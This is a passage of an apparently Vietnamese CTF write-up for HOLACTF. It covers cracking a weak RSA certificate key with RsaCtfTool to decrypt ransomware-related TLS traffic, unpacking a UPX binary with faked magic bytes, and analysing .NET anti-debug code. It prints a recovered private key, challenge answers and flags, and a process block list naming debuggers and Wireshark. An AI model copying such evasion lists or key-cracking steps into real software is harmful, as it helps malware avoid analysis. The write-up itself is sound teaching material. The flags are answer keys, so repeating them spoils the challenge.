ba:23:a0:04:30:00:00:00:00:00:00:00:00:00:00:</span><br><span class="line">                    00:00:00:00:00:02:29:7e:23</span><br><span class="line">                Exponent: 65537 (0x10001)</span><br><span class="line">        X509v3 extensions:</span><br><span class="line">            X509v3 Subject Key Identifier:</span><br><span class="line">                AA:AA:16:93:76:3F:B4:9B:92:A8:AF:30:0D:AA:31:56:D7:41:6C:11</span><br><span class="line">            X509v3 Authority Key Identifier:</span><br><span class="line">                AA:AA:16:93:76:3F:B4:9B:92:A8:AF:30:0D:AA:31:56:D7:41:6C:11</span><br><span class="line">            X509v3 Basic Constraints:</span><br><span class="line">                CA:TRUE</span><br><span class="line">    Signature Algorithm: sha256WithRSAEncryption</span><br><span class="line">    Signature Value:</span><br><span class="line">        07:17:d8:30:0f:08:9e:40:c9:34:94:1a:16:2f:21:37:78:c9:</span><br><span class="line">        bb:b8:d0:93:13:2f:60:40:e4:8a:ab:32:7f:1c:da:75:ad:17:</span><br><span class="line">        cd:21:44:07:0e:4e:2c:5a:6e:9f:70:b1:b0:cc:50:40:1d:65:</span><br><span class="line">        11:a7:88:8d:c7:f8:4e:6d:ed:20:c1:e2:d3:47:94:3d:a2:33:</span><br><span class="line">        bd:2a:35:fe:8a:09:42:7c:7d:ce:60:58:85:e0:bf:69:30:ed:</span><br><span class="line">        32:96:96:88:83:49:a2:0b:a9:0c:01:80:e1:15:12:8c:90:2c:</span><br><span class="line">        24:de:20:10:ec:80:a7:d2:8b:52:ee:33:6c:3e:65:a5:93:66:</span><br><span class="line">        e6:e7</span><br></pre></td></tr></table></figure>

<p>D√πng RSAtool</p>
<figure class="highlight plaintext"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br><span class="line">10</span><br><span class="line">11</span><br><span class="line">12</span><br><span class="line">13</span><br><span class="line">14</span><br><span class="line">15</span><br><span class="line">16</span><br><span class="line">17</span><br><span class="line">18</span><br><span class="line">19</span><br></pre></td><td class="code"><pre><span class="line"> python RsaCtfTool/src/RsaCtfTool/main.py --publickey ../public.cer --private</span><br><span class="line">Results for ../public.cer:</span><br><span class="line"></span><br><span class="line">Private key :</span><br><span class="line">-----BEGIN RSA PRIVATE KEY-----</span><br><span class="line">MIICXAIBAAKBgQCOZ5wvXkT/j1cPCeqn6nZIWWHbUMbSuIbm3cwRG8p9xUaN9r73</span><br><span class="line">ALWgqhzHaAwWEAiQjit8vdmVFROHteaDUoBu2emKqXHcPq6IqVsbkt0pcrHX0Qo+</span><br><span class="line">kVDBABWw22+GvUnpT365smOODbojoAQwAAAAAAAAAAAAAAAAAAAAAil+IwIDAQAB</span><br><span class="line">AoGAFDXGJ77UQgTA0USSBfSzhr8QsUR8gylnE9rEfGUaTtExmzI6lemG3V9nKDGv</span><br><span class="line">DW6HGKTkrRZwi8Tq+aaqKVcLHPokNoLqCTGIIxzTG1KMh6ncHcEt2LjIau9XZAmH</span><br><span class="line">/pYbOUUZCZ10VXV2knn4XtApL9bQKS/W0Ckv1tApL9cerxkCQQC+7vtYSv+GA6r7</span><br><span class="line">VQ/6z9j6XKR+T4jUU3Eny9L+YhRfCEVEtlM1UVW2r5nUCuQAAAAAAAAAAAAAAAAA</span><br><span class="line">AAAAAA9XAkEAvu77WEr/hgOq+1UP+s/Y+lykfk+I1FNxJ8vS/mIUXwhFRLZTNVFV</span><br><span class="line">tq+Z1ArkAAAAAAAAAAAAAAAAAAAAAAAkFQJBAIpCge2IuYnw5AKFsUGc+vEo3tC8</span><br><span class="line">hUfDeKApv4sHuNqsIYTFRnHIiPn2JL1geYPqfBWD6nwVg+p8FYPqfBWD9ZcCQBjJ</span><br><span class="line">dZ/UvK9tMnlGZbit2wFFnaU4Ng86deowr8eOfA6KSFPPR6YYVQROb63za/4EAfv+</span><br><span class="line">BAH7/gQB+/4EAfv+CLECQFkQ/IbcTsugzporrmibrWMkqLgTphVUVq1F3YGoA9BY</span><br><span class="line">FSCVRINF5585CYRrevEN+y3M5Xvm7il2HeQJpGY1D1o=</span><br><span class="line">-----END RSA PRIVATE KEY-----</span><br></pre></td></tr></table></figure>

<p>r·ªìi gi·ªù th√¨ v√†o wireshark : Edit-&gt;Preference-&gt; Protocol-&gt;TLS-&gt; RSA key list -&gt; import private key v√†o<br><img src="https://hackmd.io/_uploads/rJAvjt-qlg.png" alt="image"><br>payload sau gi·∫£ m√£</p>
<figure class="highlight plaintext"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br></pre></td><td class="code"><pre><span class="line">‚îå‚îÄ‚îÄ(thong„âøDESKTOP-SD4MBKE)-[/mnt/c/users/tttho/downloads/rsatool]</span><br><span class="line">‚îî‚îÄ$ ls -la ../package/</span><br><span class="line">total 8</span><br><span class="line">drwxrwxrwx 1 thong thong  512 Aug 31 11:59 .</span><br><span class="line">drwxrwxrwx 1 thong thong  512 Aug 31 14:36 ..</span><br><span class="line">-rwxrwxrwx 1 thong thong  256 Aug 30 02:46 kita.key</span><br><span class="line">-rwxrwxrwx 1 thong thong 7218 Aug 30 02:48 original_files.txt</span><br></pre></td></tr></table></figure>

<p>ƒë·ªçc file original_files.txt -&gt; file video.mp4<br>v·∫≠y l√†m sao gi·∫£i m√£ l·∫•y key ban ƒë·∫ßu t√¥i th·ª≠ t√¨m file video.mp4 xem c√≤n trong fs th·∫≠t n√≥ v·∫´n c√≤n ƒë∆∞·ª£c l∆∞u trong folder vmware temp :))<br>t√¥i s·∫Ω xor cipher ^ plaintext -&gt; key (v√† c≈©ng do t√¥i kh√¥ng th·ªÉ d√πng c√°ch c≈© ƒë·ªÉ crack privatekey t·ª´ publickey n√™n t√¥i kh√¥ng th·ªÉ resolve l·∫°i ƒë∆∞·ª£c key ban ƒë·∫ßu kh√° b·ªëi r·ªëi trong giai ƒëo·∫°n n√†y)<br>d√πng key ƒë·ªÉ decrypt c√°c file c√≤n l·∫°i<br><img src="https://hackmd.io/_uploads/BkR_hKZcxg.png" alt="findkey"><br><img src="https://hackmd.io/_uploads/B1emaFW5gg.png" alt="decryption"><br>ch∆∞∆°ng tr√¨nh decryption folder decrypt 5 folder ban ƒë·∫ßu ƒëc truy·ªÅn v√†o main code nh√©<br>check</p>
<figure class="highlight plaintext"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br></pre></td><td class="code"><pre><span class="line">file evidenceeeee/*</span><br><span class="line">evidenceeeee/dec_files/TYTUTtTtkPuXsZaiwiKa.dec: ASCII text, with no line terminators</span><br><span class="line">‚îå‚îÄ‚îÄ(thong„âøDESKTOP-SD4MBKE)-[/mnt/c/users/tttho/downloads]</span><br><span class="line">‚îî‚îÄ$ cat evidenceeeee/dec_files/TYTUTtTtkPuXsZaiwiKa.dec</span><br><span class="line">Nice bro, answer the remaining questions to get the flag ^^</span><br><span class="line">‚îå‚îÄ‚îÄ(thong„âøDESKTOP-SD4MBKE)-[/mnt/c/users/tttho/downloads]</span><br><span class="line">‚îî‚îÄ$ md5sum evidenceeeee/dec_files/TYTUTtTtkPuXsZaiwiKa.dec</span><br><span class="line">0e2c58ea5f51647dc2f81a03b43b6580  evidenceeeee/dec_files/TYTUTtTtkPuXsZaiwiKa.dec</span><br><span class="line"></span><br></pre></td></tr></table></figure>

<h4 id="Dap-an-cho-7-8-9"><a href="#Dap-an-cho-7-8-9" class="headerlink" title="ƒê√°p √°n cho 7,8,9"></a>ƒê√°p √°n cho 7,8,9</h4><blockquote>
<p>Q7: In stage 3, which C2 IP address is the user‚Äôs network traffic transmit to?<br>Ex: 192.168.1.1<br>Ans: 192.168.244.129<br>Correct!<br>Q8: The attacker made a mistake, take advantage of it and tell us the name of files encrypted by attacker‚Äôs ransomware in folder Videos ?<br>Ex: ehc.mp3<br>Ans: video.mp4<br>Correct!<br>Q9: What are the contents of the file flag.txt? (Convert the content of the flag.txt to md5 and submit)<br>Ex: 4a34decdd3494446ff0546364aa975b5<br>Ans: 0e2c58ea5f51647dc2f81a03b43b6580<br>Correct! Here is your flag:<br>HOLACTF{dUN6_BA0_9I0_CI1ck_V40_5traN63_f11e_Nhe_4huhu_5e740da065a1}</p>
</blockquote>
<h2 id="Reverse"><a href="#Reverse" class="headerlink" title="Reverse"></a>Reverse</h2><h3 id="RE102"><a href="#RE102" class="headerlink" title="RE102"></a>RE102</h3><p><img src="https://hackmd.io/_uploads/rk0ymTZ9lg.png" alt="image"></p>
<ul>
<li>·ªû b√†i n√†y m√¨nh nh·∫≠n ƒë∆∞·ª£c m·ªôt file <code>ELF64</code>, khi m√¨nh ƒë∆∞a v√†o IDA ƒë·ªÉ decomple th√¨ d∆∞·ªùng nh∆∞ n√≥ ƒë√£ b·ªã pack. Ti·∫øp t·ª•c m√¨nh xem ph·∫ßn string th√¨ n√≥ c√≥ 2 d√≤ng sau.<br><img src="https://hackmd.io/_uploads/r1wy4a-9eg.png" alt="image"></li>
<li>L√∫c n√†y m√¨nh nghi ng·ªù n√≥ b·ªã pack l·∫°i b·ªùi UPX. Nh∆∞ng khi m√¨nh check b·∫±ng DIE th√¨ ch·∫£ th·∫•y g√¨.</li>
<li>ƒê·∫øn khi m√¨nh v·ª©t v√†o HxD ƒë·ªÉ xem c·∫•u tr√∫c header c·ªßa file th√¨ m√¨nh c√≥ th·∫•y n√≥ gi·ªëng c·∫•u tr√∫c c·ªßa file ELF b·ªã pack b·ªüi UPX. V√† th√¥ng th∆∞·ªùng signature UPX! s·∫Ω b·∫Øt ƒë·∫ßu t·ª´ 0xEC -&gt; 0xEF nh∆∞ng n√≥ b·ªã thay th·∫ø b·ªùi FAKE. ƒê√¢y l√† ph·∫ßn th√¥ng tin v·ªÅ k·ªπ thu·∫≠t n√†y.<br><a target="_blank" rel="noopener" href="https://www.akamai.com/blog/security/upx-packed-headaches">https://www.akamai.com/blog/security/upx-packed-headaches</a><br><img src="https://hackmd.io/_uploads/rJnA4pb9el.png" alt="image"></li>
<li>T·ª´ ƒë√≥ m√¨nh s·∫Ω thay th·∫ø to√†n b·ªô <code>FAKE -&gt; UPX!</code></li>
<li>Sau khi unpack th√¨ m√¨nh ƒë√£ c√≥ m·ªôt ƒëo·∫°n m√£ ƒë·∫πp.</li>
</ul>
<figure class="highlight c"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br><span class="line">10</span><br><span class="line">11</span><br><span class="line">12</span><br><span class="line">13</span><br><span class="line">14</span><br><span class="line">15</span><br><span class="line">16</span><br><span class="line">17</span><br><span class="line">18</span><br><span class="line">19</span><br><span class="line">20</span><br><span class="line">21</span><br><span class="line">22</span><br><span class="line">23</span><br><span class="line">24</span><br><span class="line">25</span><br><span class="line">26</span><br><span class="line">27</span><br><span class="line">28</span><br><span class="line">29</span><br><span class="line">30</span><br><span class="line">31</span><br><span class="line">32</span><br><span class="line">33</span><br><span class="line">34</span><br><span class="line">35</span><br><span class="line">36</span><br><span class="line">37</span><br><span class="line">38</span><br><span class="line">39</span><br><span class="line">40</span><br><span class="line">41</span><br><span class="line">42</span><br><span class="line">43</span><br><span class="line">44</span><br><span class="line">45</span><br><span class="line">46</span><br><span class="line">47</span><br><span class="line">48</span><br><span class="line">49</span><br><span class="line">50</span><br><span class="line">51</span><br><span class="line">52</span><br><span class="line">53</span><br><span class="line">54</span><br><span class="line">55</span><br><span class="line">56</span><br><span class="line">57</span><br><span class="line">58</span><br><span class="line">59</span><br><span class="line">60</span><br><span class="line">61</span><br><span class="line">62</span><br><span class="line">63</span><br><span class="line">64</span><br><span class="line">65</span><br><span class="line">66</span><br><span class="line">67</span><br><span class="line">68</span><br><span class="line">69</span><br><span class="line">70</span><br><span class="line">71</span><br><span class="line">72</span><br><span class="line">73</span><br><span class="line">74</span><br><span class="line">75</span><br><span class="line">76</span><br><span class="line">77</span><br><span class="line">78</span><br><span class="line">79</span><br><span class="line">80</span><br><span class="line">81</span><br><span class="line">82</span><br><span class="line">83</span><br><span class="line">84</span><br><span class="line">85</span><br><span class="line">86</span><br><span class="line">87</span><br><span class="line">88</span><br><span class="line">89</span><br><span class="line">90</span><br><span class="line">91</span><br><span class="line">92</span><br><span class="line">93</span><br><span class="line">94</span><br><span class="line">95</span><br><span class="line">96</span><br><span class="line">97</span><br><span class="line">98</span><br><span class="line">99</span><br><span class="line">100</span><br><span class="line">101</span><br><span class="line">102</span><br><span class="line">103</span><br></pre></td><td class="code"><pre><span class="line">    <span class="type">int</span> __fastcall <span class="title function_">main</span><span class="params">(<span class="type">int</span> argc, <span class="type">const</span> <span class="type">char</span> **argv, <span class="type">const</span> <span class="type">char</span> **envp)</span></span><br><span class="line">&#123;</span><br><span class="line">  <span class="type">unsigned</span> <span class="type">int</span> v3; <span class="comment">// eax</span></span><br><span class="line">  <span class="type">const</span> <span class="type">char</span> *v4; <span class="comment">// rax</span></span><br><span class="line">  <span class="type">char</span> s2[<span class="number">8</span>]; <span class="comment">// [rsp+14h] [rbp-1Ch] BYREF</span></span><br><span class="line">  <span class="type">int</span> v7; <span class="comment">// [rsp+1Ch] [rbp-14h]</span></span><br><span class="line">  <span class="type">int</span> v8; <span class="comment">// [rsp+20h] [rbp-10h]</span></span><br><span class="line">  <span class="type">int</span> j; <span class="comment">// [rsp+24h] [rbp-Ch]</span></span><br><span class="line">  <span class="type">int</span> i; <span class="comment">// [rsp+28h] [rbp-8h]</span></span><br><span class="line">  <span class="type">int</span> v11; <span class="comment">// [rsp+2Ch] [rbp-4h]</span></span><br><span class="line"></span><br><span class="line">  signal(<span class="number">5</span>, handle_security_violation);</span><br><span class="line">  v3 = time(<span class="number">0</span>);</span><br><span class="line">  srand(v3);</span><br><span class="line">  <span class="built_in">puts</span>(<span class="string">&quot;SecureSoft Enterprise License Management System v4.7.2&quot;</span>);</span><br><span class="line">  <span class="built_in">puts</span>(<span class="string">&quot;Copyright (c) 2024 SecureSoft Technologies Inc.&quot;</span>);</span><br><span class="line">  <span class="built_in">puts</span>(<span class="string">&quot;Initializing secure authentication protocols...\n&quot;</span>);</span><br><span class="line">  initialize_logging_system();</span><br><span class="line">  v11 = <span class="number">0</span>;</span><br><span class="line">  v8 = verify_database_connection();</span><br><span class="line">  v7 = validate_license_server();</span><br><span class="line">  perform_system_maintenance();</span><br><span class="line">  <span class="keyword">if</span> ( check_debugger_presence() )</span><br><span class="line">  &#123;</span><br><span class="line">    ++v11;</span><br><span class="line">    <span class="built_in">puts</span>(<span class="string">&quot;Warning: Debugger environment detected&quot;</span>);</span><br><span class="line">  &#125;</span><br><span class="line">  configure_user_settings();</span><br><span class="line">  <span class="keyword">for</span> ( i = <span class="number">0</span>; i &lt;= <span class="number">4</span>; ++i )</span><br><span class="line">  &#123;</span><br><span class="line">    usleep(<span class="number">0xC350u</span>);</span><br><span class="line">    <span class="built_in">printf</span>(<span class="string">&quot;Loading security module %d/5...\n&quot;</span>, i + <span class="number">1</span>);</span><br><span class="line">  &#125;</span><br><span class="line">  <span class="keyword">if</span> ( validate_system_integrity() )</span><br><span class="line">  &#123;</span><br><span class="line">    ++v11;</span><br><span class="line">    <span class="built_in">puts</span>(<span class="string">&quot;Warning: System integrity compromised&quot;</span>);</span><br><span class="line">  &#125;</span><br><span class="line">  <span class="keyword">if</span> ( measure_execution_timing() )</span><br><span class="line">  &#123;</span><br><span class="line">    ++v11;</span><br><span class="line">    <span class="built_in">puts</span>(<span class="string">&quot;Warning: Abnormal execution timing detected&quot;</span>);</span><br><span class="line">  &#125;</span><br><span class="line">  <span class="built_in">printf</span>(<span class="string">&quot;Database connections: %d\n&quot;</span>, g_database_connections);</span><br><span class="line">  <span class="keyword">if</span> ( g_network_status )</span><br><span class="line">    v4 = <span class="string">&quot;Online&quot;</span>;</span><br><span class="line">  <span class="keyword">else</span></span><br><span class="line">    v4 = <span class="string">&quot;Offline&quot;</span>;</span><br><span class="line">  <span class="built_in">printf</span>(<span class="string">&quot;Network status: %s\n&quot;</span>, v4);</span><br><span class="line">  <span class="built_in">printf</span>(<span class="string">&quot;Encryption level: %d bits\n&quot;</span>, g_encryption_level % <span class="number">512</span> + <span class="number">128</span>);</span><br><span class="line">  <span class="keyword">if</span> ( scan_parent_process() )</span><br><span class="line">  &#123;</span><br><span class="line">    ++v11;</span><br><span class="line">    <span class="built_in">puts</span>(<span class="string">&quot;Warning: Suspicious parent process detected&quot;</span>);</span><br><span class="line">  &#125;</span><br><span class="line">  <span class="keyword">if</span> ( v11 &lt;= <span class="number">0</span> )</span><br><span class="line">  &#123;</span><br><span class="line">    <span class="built_in">puts</span>(<span class="string">&quot;System integrity verified. Proceeding with license validation...&quot;</span>);</span><br><span class="line">    <span class="keyword">if</span> ( argc == <span class="number">2</span> )</span><br><span class="line">    &#123;</span><br><span class="line">      <span class="built_in">printf</span>(<span class="string">&quot;Validating license key: %s\n&quot;</span>, argv[<span class="number">1</span>]);</span><br><span class="line">      <span class="built_in">strcpy</span>(s2, <span class="string">&quot;reverse&quot;</span>);</span><br><span class="line">      <span class="keyword">if</span> ( !<span class="built_in">strcmp</span>(argv[<span class="number">1</span>], s2) )</span><br><span class="line">      &#123;</span><br><span class="line">        <span class="built_in">puts</span>(<span class="string">&quot;License key accepted. Connecting to activation servers...&quot;</span>);</span><br><span class="line">        <span class="keyword">for</span> ( j = <span class="number">0</span>; j &lt;= <span class="number">2</span>; ++j )</span><br><span class="line">        &#123;</span><br><span class="line">          usleep(<span class="number">0x30D40u</span>);</span><br><span class="line">          <span class="built_in">printf</span>(<span class="string">&quot;Authenticating with server %d...\n&quot;</span>, j + <span class="number">1</span>);</span><br><span class="line">        &#125;</span><br><span class="line">        <span class="keyword">if</span> ( activate_premium_subscription() )</span><br><span class="line">        &#123;</span><br><span class="line">          <span class="built_in">puts</span>(<span class="string">&quot;All systems operational. Welcome to SecureSoft Enterprise!&quot;</span>);</span><br><span class="line">          <span class="keyword">return</span> <span class="number">0</span>;</span><br><span class="line">        &#125;</span><br><span class="line">        <span class="keyword">else</span></span><br><span class="line">        &#123;</span><br><span class="line">          <span class="built_in">puts</span>(<span class="string">&quot;Server authentication failed. Switching to educational mode.&quot;</span>);</span><br><span class="line">          launch_educational_version();</span><br><span class="line">          <span class="keyword">return</span> <span class="number">1</span>;</span><br><span class="line">        &#125;</span><br><span class="line">      &#125;</span><br><span class="line">      <span class="keyword">else</span></span><br><span class="line">      &#123;</span><br><span class="line">        <span class="built_in">puts</span>(<span class="string">&quot;Invalid license key provided. Starting demo session.&quot;</span>);</span><br><span class="line">        start_demo_session();</span><br><span class="line">        <span class="keyword">return</span> <span class="number">1</span>;</span><br><span class="line">      &#125;</span><br><span class="line">    &#125;</span><br><span class="line">    <span class="keyword">else</span></span><br><span class="line">    &#123;</span><br><span class="line">      <span class="built_in">printf</span>(<span class="string">&quot;Usage: %s &lt;license_key&gt;\n&quot;</span>, *argv);</span><br><span class="line">      <span class="built_in">puts</span>(<span class="string">&quot;Contact support@securesoft.com for license activation.&quot;</span>);</span><br><span class="line">      <span class="keyword">return</span> <span class="number">1</span>;</span><br><span class="line">    &#125;</span><br><span class="line">  &#125;</span><br><span class="line">  <span class="keyword">else</span></span><br><span class="line">  &#123;</span><br><span class="line">    <span class="built_in">printf</span>(<span class="string">&quot;Security policy violations detected (%d). Entering safe mode.\n&quot;</span>, v11);</span><br><span class="line">    <span class="built_in">printf</span>(<span class="string">&quot;Trial access granted: %s\n&quot;</span>, trial_subscription);</span><br><span class="line">    <span class="keyword">return</span> <span class="number">0</span>;</span><br><span class="line">  &#125;</span><br><span class="line">&#125;</span><br></pre></td></tr></table></figure>

<ul>
<li>V√† ƒë√¢y ch√≠nh l√† ƒëo·∫°n ch√≠nh x·ª≠ l√Ω flag.</li>
</ul>
<figure class="highlight c"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br><span class="line">10</span><br><span class="line">11</span><br><span class="line">12</span><br><span class="line">13</span><br><span class="line">14</span><br><span class="line">15</span><br><span class="line">16</span><br><span class="line">17</span><br><span class="line">18</span><br></pre></td><td class="code"><pre><span class="line">__int64 <span class="title function_">activate_premium_subscription</span><span class="params">()</span></span><br><span class="line">&#123;</span><br><span class="line">  _BYTE v1[<span class="number">16</span>]; <span class="comment">// [rsp+0h] [rbp-70h] BYREF</span></span><br><span class="line">  _BYTE v2[<span class="number">16</span>]; <span class="comment">// [rsp+10h] [rbp-60h] BYREF</span></span><br><span class="line">  _BYTE v3[<span class="number">72</span>]; <span class="comment">// [rsp+20h] [rbp-50h] BYREF</span></span><br><span class="line">  <span class="type">int</span> v4; <span class="comment">// [rsp+68h] [rbp-8h]</span></span><br><span class="line">  <span class="type">int</span> v5; <span class="comment">// [rsp+6Ch] [rbp-4h]</span></span><br><span class="line"></span><br><span class="line">  initialize_network_protocols(&amp;database_connection_string, v2, <span class="number">16</span>);</span><br><span class="line">  initialize_network_protocols(&amp;api_authentication_token, v1, <span class="number">16</span>);</span><br><span class="line">  v5 = process_encrypted_subscription(&amp;premium_subscription_data, <span class="number">32</span>, v2, v1, v3);</span><br><span class="line">  <span class="keyword">if</span> ( v5 &lt;= <span class="number">0</span> )</span><br><span class="line">    <span class="keyword">return</span> <span class="number">0</span>;</span><br><span class="line">  v4 = v3[v5 - <span class="number">1</span>];</span><br><span class="line">  v3[v5 - v4] = <span class="number">0</span>;</span><br><span class="line">  <span class="built_in">puts</span>(<span class="string">&quot;Premium subscription activated! Access granted.&quot;</span>);</span><br><span class="line">  <span class="keyword">return</span> <span class="number">1</span>;</span><br><span class="line">&#125;</span><br></pre></td></tr></table></figure>

<ul>
<li>Hai ƒëo·∫°n m√£ call h√†m ƒë·∫ßu ti√™n l√† n∆°i x·ª≠ l√Ω Key v√† IV. N√≥ s·∫Ω l·∫•y <code>database_connection_string</code> v√† <code>api_authentication_token</code> XOR 0x5A.</li>
</ul>
<figure class="highlight c"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br><span class="line">10</span><br><span class="line">11</span><br><span class="line">12</span><br><span class="line">13</span><br><span class="line">14</span><br></pre></td><td class="code"><pre><span class="line">    __int64 __fastcall <span class="title function_">initialize_network_protocols</span><span class="params">(__int64 a1, __int64 a2, <span class="type">int</span> a3)</span></span><br><span class="line">&#123;</span><br><span class="line">  __int64 result; <span class="comment">// rax</span></span><br><span class="line">  <span class="type">unsigned</span> <span class="type">int</span> i; <span class="comment">// [rsp+20h] [rbp-4h]</span></span><br><span class="line"></span><br><span class="line">  <span class="keyword">for</span> ( i = <span class="number">0</span>; ; ++i )</span><br><span class="line">  &#123;</span><br><span class="line">    result = i;</span><br><span class="line">    <span class="keyword">if</span> ( i &gt;= a3 )</span><br><span class="line">      <span class="keyword">break</span>;</span><br><span class="line">    *(i + a2) = *(i + a1) ^ <span class="number">0x5A</span>;</span><br><span class="line">  &#125;</span><br><span class="line">  <span class="keyword">return</span> result;</span><br><span class="line">&#125;</span><br></pre></td></tr></table></figure>

<blockquote>
<ul>
<li>Key: MySecretKey12345</li>
<li>IV: 1234567890123456</li>
</ul>
</blockquote>
<ul>
<li>Sau ƒë√≥ n√≥ s·∫Ω ƒë∆∞a v√†o h√†m n√†y ƒë·ªÉ gi·∫£i m√£ flag v·ªõi key v√† IV tr√™n.</li>
<li>M√¨nh s·∫Ω dump data c·ªßa <code>premium_subscription_data</code> ƒë·ªÉ gi·∫£i m√£.</li>
<li>Flag s·∫Ω c√≥ format l√† <strong><em>HOLACTF{hex}</em></strong><blockquote>
<p><strong>FLAG:</strong> HOLACTF{1b0b403ac790763ba5218d13801aa4e801c5947d4d25705006e5c603b08807f2}</p>
</blockquote>
</li>
</ul>
<h3 id="RE103"><a href="#RE103" class="headerlink" title="RE103"></a>RE103</h3><p><img src="https://hackmd.io/_uploads/Skfg3bM9le.png" alt="image"></p>
<ul>
<li>B√†i n√†y m√¨nh nh·∫≠n ƒë∆∞·ª£c m·ªôt file .NET antidebug kh√° n·∫∑ng.<br><img src="https://hackmd.io/_uploads/Syt52Zz9eg.png" alt="image"></li>
<li>V√≠ d·ª• nh∆∞ t·∫°i ƒë√¢y n√≥ ƒëang check proccess xem ta c√≥ ƒëang d√πng c√°c ph·∫ßn m·ªÅm trong list n√†y kh√¥ng n·∫øu c√≥ s·∫Ω b·ªã g·∫Øn c·ªù debug v√† ch·∫°y sang m·ªôt lu·ªìng kh√°c v√† print ra fake flag.</li>
</ul>
<figure class="highlight csharp"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br><span class="line">10</span><br><span class="line">11</span><br><span class="line">12</span><br><span class="line">13</span><br><span class="line">14</span><br><span class="line">15</span><br><span class="line">16</span><br><span class="line">17</span><br><span class="line">18</span><br><span class="line">19</span><br><span class="line">20</span><br><span class="line">21</span><br><span class="line">22</span><br><span class="line">23</span><br><span class="line">24</span><br><span class="line">25</span><br><span class="line">26</span><br><span class="line">27</span><br></pre></td><td class="code"><pre><span class="line"><span class="comment">// Token: 0x06000006 RID: 6 RVA: 0x000023E4 File Offset: 0x000005E4</span></span><br><span class="line">		<span class="function"><span class="keyword">private</span> <span class="keyword">static</span> <span class="keyword">void</span> <span class="title">ValidateExecutionEnvironment</span>()</span></span><br><span class="line">		&#123;</span><br><span class="line">			<span class="built_in">string</span>[] array = <span class="keyword">new</span> <span class="built_in">string</span>[]</span><br><span class="line">			&#123;</span><br><span class="line">				<span class="string">&quot;ollydbg&quot;</span>, <span class="string">&quot;x64dbg&quot;</span>, <span class="string">&quot;ida&quot;</span>, <span class="string">&quot;ghidra&quot;</span>, <span class="string">&quot;radare2&quot;</span>, <span class="string">&quot;cheatengine&quot;</span>, <span class="string">&quot;processhacker&quot;</span>, <span class="string">&quot;procmon&quot;</span>, <span class="string">&quot;wireshark&quot;</span>, <span class="string">&quot;fiddler&quot;</span>,</span><br><span class="line">				<span class="string">&quot;dnspy&quot;</span>, <span class="string">&quot;reflexil&quot;</span>, <span class="string">&quot;ilspy&quot;</span>, <span class="string">&quot;dotpeek&quot;</span>, <span class="string">&quot;justdecompile&quot;</span></span><br><span class="line">			&#125;;</span><br><span class="line">			<span class="keyword">try</span></span><br><span class="line">			&#123;</span><br><span class="line">				Process[] processes = Process.GetProcesses();</span><br><span class="line">				Process[] array2 = processes;</span><br><span class="line">				<span class="keyword">for</span> (<span class="built_in">int</span> i = <span class="number">0</span>; i &lt; array2.Length; i++)</span><br><span class="line">				&#123;</span><br><span class="line">					Process process = array2[i];</span><br><span class="line">					<span class="built_in">string</span> processName = process.ProcessName.ToLower();</span><br><span class="line">					<span class="keyword">if</span> (array.Any((<span class="built_in">string</span> forbidden) =&gt; processName.Contains(forbidden)))</span><br><span class="line">					&#123;</span><br><span class="line">						NetworkConfigurationManager.LaunchSystemDiagnosticUtility();</span><br><span class="line">						Environment.Exit(<span class="number">0</span>);</span><br><span class="line">					&#125;</span><br><span class="line">				&#125;</span><br><span class="line">			&#125;</span><br><span class="line">			<span class="keyword">catch</span></span><br><span class="line">			&#123;</span><br><span class="line">			&#125;</span><br><span class="line">		&#125;</span><br></pre></td></tr></table></figure>

<ul>
<li>V√† c√≥ m√¥t v√†i tr∆∞·ªùng h·ª£p antidebug kh√°c, nh∆∞ng l√∫c n√†y m√¨nh c√≥ th·∫•y m·ªôt ƒëi·ªÉm kh√° ƒë√°ng ng·ªù.<br><img src="https://hackmd.io/_uploads/H1lCTbG9gg.png" alt="image"></li>
<li>Li·ªáu c√°c data n√†y n√≥ c√≥ ch·ª©c nƒÉng g√¨. M√¨nh s·∫Ω truy ng∆∞·ª£c n∆°i s·ª≠ d·ª•ng <code>g_lpCriticalSystemData</code>.</li>
</ul>
<figure class="highlight csharp"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br><span class="line">10</span><br><span class="line">11</span><br><span class="line">12</span><br><span class="line">13</span><br><span class="line">14</span><br><span class="line">15</span><br><span class="line">16</span><br><span class="line">17</span><br><span class="line">18</span><br><span class="line">19</span><br><span class="line">20</span><br></pre></td><td class="code"><pre><span class="line"><span class="function"><span class="keyword">private</span> <span class="keyword">static</span> <span class="built_in">string</span> <span class="title">DecryptProtectedData</span>()</span></span><br><span class="line">&#123;</span><br><span class="line">	<span class="built_in">string</span> text;</span><br><span class="line">	<span class="keyword">try</span></span><br><span class="line">	&#123;</span><br><span class="line">		<span class="built_in">byte</span>[] array = NetworkConfigurationManager.ReconstructCipherKey();</span><br><span class="line">		<span class="built_in">byte</span>[] array2 = NetworkConfigurationManager.ProcessDataWithCipher(NetworkConfigurationManager.g_lpCriticalSystemData, array);</span><br><span class="line">		<span class="built_in">string</span> @string = Encoding.UTF8.GetString(array2);</span><br><span 